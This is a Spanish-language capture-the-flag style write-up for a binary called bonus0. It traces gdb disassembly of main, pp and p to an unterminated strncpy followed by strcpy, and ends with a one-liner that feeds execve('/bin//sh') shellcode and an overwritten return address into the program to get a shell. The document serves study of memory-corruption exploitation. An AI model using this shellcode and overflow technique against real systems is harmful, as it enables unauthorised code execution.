1.- Analizamos con gdb y encontramos dos funciones a parte de main() que son pp() y p()

  main() -> pp(char *dest) -> p(char *dest, char *s)

  main()
  [...]
  0x080485b1 <+13>:    mov    DWORD PTR [esp],eax
  0x080485b4 <+16>:    call   0x804851e <pp>
  0x080485b9 <+21>:    lea    eax,[esp+0x16]
  [...]

2.- A la función pp() main() le pasa como argumento un char* de 42 bytes
  
  main()
  [...]
  0x080485aa <+6>:     sub    esp,0x40
  0x080485ad <+9>:     lea    eax,[esp+0x16]
  0x080485b1 <+13>:    mov    DWORD PTR [esp],eax
  0x080485b4 <+16>:    call   0x804851e <pp>
  [...]

  Reserva en el stack 0x40 bytes y le pasa a la función pp() esp+0x16 (0x40 - 0x16 = 0x2a) 42 decimal


3.- Examinando la funcion pp() vemos que llama dos veces a la función p() y le pasa como argumento un char* de 20 bytes
  
  pp()
  [...]
  0x0804852e <+16>:    lea    eax,[ebp-0x30]
  0x08048531 <+19>:    mov    DWORD PTR [esp],eax
  0x08048534 <+22>:    call   0x80484b4 <p>
  0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0
  0x08048541 <+35>:    lea    eax,[ebp-0x1c]
  0x08048544 <+38>:    mov    DWORD PTR [esp],eax
  0x08048547 <+41>:    call   0x80484b4 <p>
  [...]

4.- En la función p() encontramos que hace un read de stdin sobre un buffer de 4096 bytes 

  p()
  [...]
  0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
  0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
  0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
  0x080484da <+38>:	mov    DWORD PTR [esp],0x0
  0x080484e1 <+45>:	call   0x8048380 <read@plt>
  [...]

5.- Luego hace un strchr para buscar el caracter '\n' sobre la cadena que ha obtenido del read para luego sustituirlo por un NUL '\0'
  
  p()
  [...]
  0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
  0x080484ee <+58>:	lea    eax,[ebp-0x1008]
  0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
  0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
  0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
  [...]

6.- Por último hace un strncpy para copiar la cadena que tiene el el los 20 primeros bytes del buffer a *str que le pasamos como parámetro a la función p()

  p()
  [...]
  0x080484ff <+75>:	lea    eax,[ebp-0x1008]
  0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
  0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
  0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
  0x08048514 <+96>:	mov    DWORD PTR [esp],eax
  0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
  [...]

7.- Volvemos a la función pp(). Copia por medio de strcpy() el primer puntero obtenido por p() a dest que se le pasa como parámetro a pp()
  
  pp()
  [...]
  0x0804854c <+46>:	lea    eax,[ebp-0x30]
  0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
  0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
  0x08048556 <+56>:	mov    DWORD PTR [esp],eax
  [...]

8.- 
  


(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0")'; python -c 'print("\x0b\xcd\x80" + "a"*11 + "\xbf\xff\xf6\xf6"[::-1] + "a")'; cat - )| ./bonus0
